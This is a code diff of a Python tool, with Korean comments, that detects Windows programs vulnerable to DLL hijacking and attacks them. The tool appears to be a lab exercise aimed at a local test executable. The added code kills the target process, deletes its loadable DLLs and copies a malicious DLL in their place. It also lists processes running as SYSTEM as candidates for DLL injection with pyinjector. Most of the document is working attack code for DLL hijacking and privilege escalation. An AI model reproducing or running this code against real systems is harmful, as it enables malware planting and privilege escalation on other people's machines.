@@ -3,6 +3,7 @@ from tqdm import tqdm
 from pyinjector import inject
 import subprocess
 import psutil
+import shutil
 class hiJacking():
     def hiJacking(self):
         pass
@@ -76,20 +77,18 @@ class hiJacking():
             return subprocess.Popen([path]).pid
         
     #악성 dll을 입력받은 경로로 바꿔줌
-    def change_dll(self,dll_path,hijactable_dll_path):
-        if type(hijactable_dll_path) is list:
+    def change_dll(self,dll_path,hijactable_dll_path,pid):
+        try:
             for i in hijactable_dll_path:
-                if os.path.exists(i):
-                    os.remove(i)
-                    os.rename(dll_path,i)
-        elif type(hijactable_dll_path) is str:
-            if os.path.exists(hijactable_dll_path):
-                os.remove(hijactable_dll_path)
-                os.rename(dll_path,hijactable_dll_path)       
+                os.remove(i)
+                shutil.copy2(dll_path,i)
+                
+        except:
+            print("Cannot remove or write DLL")
     # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
     # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
     def attack(self):
-        path_exe = "C:/Users/codeb/Desktop/ExamDLL2/CreateDLL/x64/Debug/MainDLL.exe"
+        path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
         path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
         pid = self.create_process(path_exe)
         program_name, list_dlls = self.list_dll(pid)
@@ -97,8 +96,9 @@ class hiJacking():
         if not len(file_list) == 0:
             if self.find_string(program_name,file_list,dir_list):
                 print("Detect programs vulnerable to dll injection")
-                print("Vulnerable PID : " + pid)
-                self.change_dll(path_dll,list_dlls)
+                print("Vulnerable PID : " + str(pid))
+                os.system('taskkill /f /pid '+str(pid))
+                self.change_dll(path_dll,dir_list,pid)
             else:
                 print("Nah....")
         else:
@@ -108,7 +108,7 @@ class injection():
         pass
     #SYSTEM 권한으로 실행되는 프로세스 파싱, return 값 => pid
     def find_process(self):
-       
+        proc_lists = []
         try:
             # 실행중인 프로세스를 순차적으로 검색
             for proc in psutil.process_iter():
@@ -119,9 +119,9 @@ class injection():
                 
                 username = proc.username()
                 if username.endswith('SYSTEM'):
-                    print("WOW")
+                    proc_lists.append(proc.ppid())
                 print('NAME:', ps_name, ' CMD:', cmdline, ' userName: ', username)
-
+            return proc_lists
         except:
             pass
         
@@ -134,11 +134,12 @@ class injection():
 
 if __name__=='__main__': 
     dll_inject = injection()
-    # dll_hijact = hiJacking()
-    # path_exe = "C:/Users/codeb/Desktop/MainDLL.exe"
-    # path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
-    # pid = dll_hijact.create_process(path_exe)
-    # inject(pid,path_dll)
-    dll_inject.find_process()
+    dll_hijact = hiJacking()
+    path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
+    path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
+    #pid = dll_hijact.create_process(path_exe)
+    #inject(pid,path_dll)
+    dll_hijact.attack()
+    
     
         
